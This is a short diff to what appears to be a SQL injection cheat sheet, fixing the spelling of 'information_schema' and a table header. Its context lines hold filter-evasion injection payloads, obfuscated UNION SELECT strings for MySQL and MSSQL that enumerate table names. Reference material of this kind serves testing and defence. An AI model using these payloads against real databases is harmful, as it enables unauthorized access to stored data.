@@ -454,7 +454,7 @@ No Whitespace - bypass using parenthesis
 ```
 
 Whitespace alternatives by DBMS
-| DBMS | ASCII Characters in hexadicimal |
+| DBMS | ASCII characters in hexadicimal |
 | ---- | ------------------------------- |
 | SQLite3 | 0A, 0D, 0C, 09, 20 |
 | MySQL	5 | 09, 0A, 0B, 0C, 0D, A0, 20 |
@@ -523,8 +523,8 @@ SELECT\N/0.e3UNION	SELECT	2
 SELECT	$.``	1.e.table_name	
 SELECT{_	.``1.e.table_name}	
 SELECT	LightOS	.	``1.e.table_name	LightOS	
-SELECT	informa4on_schema 1337.e.tables	13.37e.table_name	
-SELECT	1	from	informa4on_schema 9.e.table_name
+SELECT	information_schema 1337.e.tables	13.37e.table_name	
+SELECT	1	from	information_schema 9.e.table_name
 ```
 
 MSSQL
@@ -537,7 +537,7 @@ SELECT	0xUNION	SELECT	2
 SELECT\UNION	SELECT	2	
 \1UNION	SELECT	2	
 SELECT	1FROM[table]WHERE\1=\1AND\1=\1	
-SELECT"table_name"FROM[informa4on_schema].[tables]	
+SELECT"table_name"FROM[information_schema].[tables]	
 ```
 
 Oracle
